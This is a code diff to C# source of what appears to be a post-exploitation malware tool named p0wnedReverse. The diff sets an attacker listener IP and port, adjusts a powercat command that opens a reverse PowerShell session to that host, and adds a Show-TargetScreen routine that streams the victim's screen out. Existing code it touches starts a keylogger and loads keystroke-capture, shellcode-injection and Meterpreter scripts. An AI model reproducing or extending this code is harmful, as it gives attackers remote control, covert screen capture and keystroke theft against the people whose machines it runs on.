@@ -111,11 +111,13 @@ namespace p0wnedReverse
         const int SW_HIDE = 0;
         const int SW_SHOW = 5;
 
-        static string LHost = "192.168.1.250";
+        static string LHost = "192.168.1.133";
 
         static string LPort = "1337";
 
-        static string PowerCat = "powercat  -c " + LHost + " -p " + LPort + " -ep -t 1000";
+        static string PowerCat = "powercat -c " + LHost + " -p " + LPort + " -ep -t 1000";
+
+        static string ShowTargetScreen = "Show-TargetScreen -Reverse -IPAddress " + LHost + " -Port 443";
 
         //static string Domain = "myDNSCat2Listener.com";
 
@@ -193,6 +195,13 @@ namespace p0wnedReverse
 
                 () =>
                 {
+                    Thread.Sleep(10000);
+                    p0wnedReverseListenerConsole listener2 = new p0wnedReverseListenerConsole();
+                    listener2.Execute(ShowTargetScreen);
+                },
+
+                () =>
+                {
                     KeyLogger.startKeylogger();
                 }
             );
@@ -219,6 +228,7 @@ namespace p0wnedReverse
                 this.currentPowerShell.AddScript(Resources.Get_KeyStrokes());
                 this.currentPowerShell.AddScript(Resources.Invoke_Shellcode());
                 this.currentPowerShell.AddScript(Resources.Invoke_Meterpreter());
+                this.currentPowerShell.AddScript(Resources.Show_TargetScreen());
 
                 this.currentPowerShell.AddScript(cmd);
                 this.currentPowerShell.AddCommand("out-default");
